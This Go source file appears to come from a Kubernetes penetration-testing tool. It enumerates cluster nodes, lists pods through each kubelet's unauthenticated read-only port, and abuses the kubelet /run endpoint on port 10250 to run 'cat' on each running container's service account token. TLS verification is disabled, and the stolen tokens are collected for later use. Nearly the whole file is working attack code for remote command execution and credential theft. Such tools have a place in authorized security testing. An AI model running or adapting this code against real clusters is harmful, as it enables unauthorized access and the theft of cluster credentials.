package app

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
)

// ExecuteCodeOnKubelet runs a command on every pod on every node via their Kubelets.
func ExecuteCodeOnKubelet(connectionString ServerInfo, serviceAccounts *[]ServiceAccount) {

	println("[+] Getting IP addresses for the nodes in the cluster...")
	// BUG : This auth check isn't catching when we're not allowed to get nodes at the cluster scope
	if !kubectlAuthCanI(connectionString, "get", "nodes") {
		println("[-] Permission Denied: your service account isn't allowed to get nodes")
		return
	}

	nodeDetailOut, _, err := runKubectlSimple(connectionString, "get", "nodes", "-o", "json")
	println(nodeDetailOut)

	if err != nil {
		println("[-] Unable to retrieve node details: ")
	} else {
		var getnodeDetail GetNodeDetails
		err := json.Unmarshal(nodeDetailOut, &getnodeDetail)
		if err != nil {
			println("[-] Error unmarshaling data in this secret: ", err)
		}

	nodeLoop:
		for _, item := range getnodeDetail.Items {

			for _, addr := range item.Status.Addresses {
				// println("[+] Found IP for node " + item.Metadata.Name + " - " + addr.Address)
				if addr.Type != "Hostname" {

					// Make a request for our service account(s)
					unauthKubeletPortURL := "http://" + addr.Address + ":10255/pods"
					nodeName := item.Metadata.Name

					println("[+] Kubelet Pod Listing URL: " + nodeName + " - " + unauthKubeletPortURL)
					println("[+] Grabbing Pods from node: " + nodeName)

					podDetails, err := getKubeletPods(unauthKubeletPortURL)
					if err != nil {
						fmt.Println("Error encountered listing pods from", unauthKubeletPortURL, "was", err)
						continue nodeLoop
					}

					for _, container := range runningPodContainers(podDetails) {
						podName := container.PodName
						podNamespace := container.PodNamespace
						containerName := container.ContainerName
						urlExecPod := "https://" + addr.Address + ":10250/run/" + podNamespace + "/" + podName + "/" + containerName + "/"
						println("===============================================================================================")
						println("Asking Kubelet to dump service account token via URL:", urlExecPod)
						println("")
						token, err := executeKubeletCommand(urlExecPod, "cat", ServiceAccountPath+"token")
						if err != nil {
							fmt.Printf("[-] Error - could not perform request --%s-- - %s\n", urlExecPod, err.Error())
							continue
						}
						println("[+] Got service account token for", "ns:"+podNamespace+" pod:"+podName+" container:"+containerName+":", token)
						println("")
						name := "Pod ns:" + podNamespace + ":" + podName

						AddNewServiceAccount(name, token, "kubelet", serviceAccounts)
					}
				}
			}
		}
	}
}

func runningPodContainers(podDetails PodDetails) []PodNamespaceContainerTuple {
	var output []PodNamespaceContainerTuple
	for _, pod := range podDetails.Items {
		for _, container := range pod.Status.ContainerStatuses {
			if container.State.Running != nil && container.Name != "pause" {
				output = append(output, PodNamespaceContainerTuple{
					PodName:       pod.Metadata.Name,
					PodNamespace:  pod.Metadata.Namespace,
					ContainerName: container.Name,
				})
			}
		}
	}
	return output
}

func getKubeletPods(kubeletPodsURL string) (PodDetails, error) {
	var headers []HeaderLine
	body, _, err := GetRequest(kubeletPodsURL, headers, false)
	if err != nil {
		return PodDetails{}, err
	}
	if body == "" || strings.HasPrefix(body, "ERROR:") {
		return PodDetails{}, fmt.Errorf("kubelet pod listing failed: %s", body)
	}

	var podDetails PodDetails
	if err := json.Unmarshal([]byte(body), &podDetails); err != nil {
		return PodDetails{}, fmt.Errorf("decode kubelet pod listing: %w", err)
	}
	return podDetails, nil
}

func executeKubeletCommand(kubeletRunURL string, command ...string) (string, error) {
	transport := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	client := &http.Client{Transport: transport}
	runURL, err := url.Parse(kubeletRunURL)
	if err != nil {
		return "", err
	}
	query := runURL.Query()
	for _, argument := range command {
		query.Add("cmd", argument)
	}
	runURL.RawQuery = query.Encode()
	req, err := http.NewRequest(http.MethodPost, runURL.String(), nil)
	if err != nil {
		return "", err
	}

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		errorBody, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		detail := strings.Join(strings.Fields(strings.ToValidUTF8(string(errorBody), "�")), " ")
		detailRunes := []rune(detail)
		if len(detailRunes) > 512 {
			detail = string(detailRunes[:512]) + "…"
		}
		if detail != "" {
			return "", fmt.Errorf("kubelet returned %s: %q", resp.Status, detail)
		}
		return "", fmt.Errorf("kubelet returned %s", resp.Status)
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(body), nil
}
